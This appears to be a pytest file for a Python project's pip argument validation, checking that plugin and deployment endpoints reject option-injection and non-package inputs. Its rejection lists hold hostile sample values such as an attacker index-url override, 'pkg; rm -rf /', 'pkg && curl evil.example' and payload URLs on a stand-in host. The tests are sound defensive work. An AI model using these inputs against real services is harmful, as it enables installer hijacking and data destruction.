"""Tests for the pip argument validation used by the plugin and deployment APIs.

Three endpoints place a client-supplied string into a pip argument vector:
plugin install, plugin uninstall, and the deployment lab's on-demand framework
installer. ``subprocess`` runs without a shell, so there is no shell injection,
but pip cannot distinguish a package named ``--index-url=http://evil/`` from
the option of that spelling - so an unvalidated name could redirect the
installer at an attacker-controlled index, install from a local path, or (via
uninstall) remove the running server's own dependencies.
"""

from __future__ import annotations

import pytest

from flowyml.utils.packages import (
    InvalidPackageNameError,
    normalize_distribution_name,
    validate_requirement,
    validate_uninstall_target,
)


class TestValidRequirements:
    @pytest.mark.parametrize(
        "requirement",
        [
            "torch",
            "scikit-learn",
            "python_multipart",
            "zope.interface",
            "a",
            "torch>=2.0",
            "numpy==1.26.4",
            "pandas>=1.3,<3.0",
            "uvicorn[standard]",
            "mkdocstrings[python]>=0.29.0",
            "flowyml-plugin-mlflow",
            "pkg~=1.4",
            "pkg!=1.0",
            "pkg===1.0",
        ],
    )
    def test_plain_specifiers_are_accepted(self, requirement):
        assert validate_requirement(requirement) == requirement

    def test_surrounding_whitespace_is_trimmed(self):
        assert validate_requirement("  torch  ") == "torch"


class TestOptionInjection:
    @pytest.mark.parametrize(
        "requirement",
        [
            "--index-url=http://evil.example/simple",
            "--extra-index-url=http://evil.example",
            "-e .",
            "-r requirements.txt",
            "--target=/etc",
            "-U",
            "--upgrade",
        ],
    )
    def test_pip_options_are_rejected(self, requirement):
        with pytest.raises(InvalidPackageNameError):
            validate_requirement(requirement)

    def test_the_error_explains_the_leading_dash(self):
        with pytest.raises(InvalidPackageNameError, match="option"):
            validate_requirement("--index-url=http://evil.example")


class TestNonPackageSpecifiers:
    @pytest.mark.parametrize(
        "requirement",
        [
            "http://evil.example/payload.tar.gz",
            "https://evil.example/payload.whl",
            "git+https://github.com/evil/repo",
            "/etc/passwd",
            "./local-package",
            "../escape",
            "pkg; rm -rf /",
            "pkg && curl evil.example",
            "pkg | sh",
            "two packages",
            "pkg\nother",
            "",
            "   ",
            ".",
            "-",
            "_leading",
            "trailing-",
        ],
    )
    def test_anything_that_is_not_a_package_name_is_rejected(self, requirement):
        with pytest.raises(InvalidPackageNameError):
            validate_requirement(requirement)

    def test_non_string_input_is_rejected(self):
        with pytest.raises(InvalidPackageNameError):
            validate_requirement(None)


class TestUninstallProtection:
    @pytest.mark.parametrize(
        "distribution",
        ["flowyml", "FlowyML", "pip", "fastapi", "uvicorn", "sqlalchemy", "pydantic-core"],
    )
    def test_the_servers_own_dependencies_cannot_be_removed(self, distribution):
        """Uninstalling any of these stops the process handling the request."""
        with pytest.raises(InvalidPackageNameError, match="depends on it"):
            validate_uninstall_target(distribution)

    def test_normalisation_defeats_spelling_tricks(self):
        """PEP 503 treats pydantic_core, pydantic-core and Pydantic.Core alike."""
        for spelling in ("pydantic_core", "pydantic.core", "PYDANTIC-CORE"):
            with pytest.raises(InvalidPackageNameError):
                validate_uninstall_target(spelling)

    def test_a_third_party_plugin_can_be_removed(self):
        assert validate_uninstall_target("flowyml-plugin-example") == "flowyml-plugin-example"

    def test_version_specifiers_are_stripped(self):
        """`pip uninstall` takes a name; a specifier would mislead the operator."""
        assert validate_uninstall_target("some-plugin>=1.0") == "some-plugin"
        assert validate_uninstall_target("some-plugin[extra]") == "some-plugin"

    def test_options_are_rejected_for_uninstall_too(self):
        with pytest.raises(InvalidPackageNameError):
            validate_uninstall_target("--yes")


class TestNormalization:
    @pytest.mark.parametrize(
        ("raw", "expected"),
        [
            ("Flowy_ML", "flowy-ml"),
            ("zope.interface", "zope-interface"),
            ("a__b", "a-b"),
            ("Already-Normal", "already-normal"),
        ],
    )
    def test_pep503_normalization(self, raw, expected):
        assert normalize_distribution_name(raw) == expected


class TestEndpointsRejectUnsafeInput:
    """The validation must actually be wired into the HTTP layer."""

    @pytest.fixture
    def client(self, monkeypatch):
        pytest.importorskip("fastapi", reason="fastapi not installed")
        from fastapi.testclient import TestClient

        monkeypatch.delenv("FLOWYML_ENV", raising=False)
        monkeypatch.delenv("FLOWYML_API_TOKEN", raising=False)

        from flowyml.ui.backend.main import app

        with TestClient(app) as test_client:
            yield test_client

    def test_plugin_uninstall_rejects_an_option(self, client):
        response = client.post("/api/plugins/uninstall/--index-url=http:%2F%2Fevil")
        assert response.status_code in (400, 404)
        if response.status_code == 400:
            assert "option" in response.json()["detail"] or "Refusing" in response.json()["detail"]

    def test_plugin_uninstall_refuses_to_remove_flowyml(self, client):
        response = client.post("/api/plugins/uninstall/flowyml")
        assert response.status_code == 400
        assert "depends on it" in response.json()["detail"]

    def test_plugin_install_rejects_a_url(self, client):
        response = client.post(
            "/api/plugins/install",
            json={"plugin_id": "https://evil.example/payload.tar.gz"},
        )
        assert response.status_code == 400

    def test_dependency_install_rejects_an_index_override(self, client):
        response = client.post(
            "/api/deployments/dependencies/install",
            json={"frameworks": ["--index-url=http://evil.example/simple"]},
        )
        assert response.status_code == 400

    def test_dependency_install_still_accepts_a_known_framework(self, client, monkeypatch):
        """Hardening must not break the legitimate flow."""
        queued = []
        from flowyml.ui.backend.routers import deployments

        monkeypatch.setattr(deployments, "_install_packages_sync", queued.append)

        response = client.post(
            "/api/deployments/dependencies/install",
            json={"frameworks": ["sklearn"]},
        )
        assert response.status_code == 200
        assert response.json()["packages"] == ["scikit-learn"]
